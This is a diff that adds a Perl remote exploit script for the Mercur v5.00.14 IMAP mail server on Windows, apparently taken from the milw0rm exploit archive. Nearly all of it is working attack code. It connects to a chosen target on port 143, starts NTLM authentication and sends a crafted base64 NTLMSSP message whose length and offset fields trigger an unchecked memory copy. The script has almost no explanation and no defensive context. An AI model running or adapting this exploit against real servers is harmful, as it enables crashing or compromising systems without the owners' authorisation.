@@ -1,0 +1,91 @@
+#!/usr/bin/perl
+#
+# mercur-v1.pl
+#
+# Mercur v5.00.14 (win32) remote exploit
+# by mu-b - Dec 2006
+#
+# - Tested on: Mercur v5.00.14 (win32)
+#
+########
+
+use Getopt::Std; getopts('t:n:', \%arg);
+use Socket;
+use MIME::Base64;
+
+&print_header;
+
+my $target;
+
+if (defined($arg{'t'})) { $target = $arg{'t'} }
+if (!(defined($target))) { &usage; }
+
+my $imapd_port = 143;
+my $send_delay = 1;
+
+if (connect_host($target, $imapd_port)) {
+    print("-> * Connected\n");
+
+    $buf = "1 AUTHENTICATE NTLM\r\n";
+    send(SOCKET, $buf, 0);
+    sleep($send_delay);
+
+    print("-> * Sending payload\n");	
+
+    # src = "NTLMSSP....."
+    $buf = "NTLMSSP".("A"x100);
+    send(SOCKET, encode_base64($buf)."\r\n", 0);
+    sleep($send_delay);
+
+    # memcpy(s, src+a, b);
+    print("-> * Sending payload 2\n");
+    $buf = "NTLMSSP".
+           "\x69".
+           "\x03\x00\x00\x00".
+           "\xff\xff".         # b
+           ("A"x2).
+           "\x00\x00".         # a
+           ("A"x2).
+           "\x00\x00".
+           ("A"x2).
+           "\x00\x00".
+           ("A"x2).
+           "\x04\x00".
+           ("A"x6).
+           "\x00\x80".
+           ("A"x6).
+           "\x04\x00".
+           ("A"x12);
+
+    send(SOCKET, encode_base64($buf)."\r\n", 0);
+    sleep($send_delay);
+
+    print("-> * Successfully sent payload!\n");
+}
+
+sub print_header {
+    print("Mercur v5.00.14 (win32) remote exploit\n");
+    print("by: <mu-b\@digit-labs.org>\n\n");
+}
+
+sub usage {
+  print(qq(Usage: $0 -t <hostname>
+
+     -t <hostname>    : hostname to test
+));
+
+    exit(1);
+}
+
+sub connect_host {
+    ($target, $port) = @_;
+    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
+    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
+    $proto  = getprotobyname('tcp')              || die("Error: $!\n");
+
+    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+    connect(SOCKET, $paddr)                      || die("Error: $!\n");
+    return(1338);
+}
+
+# milw0rm.com [2007-03-20]
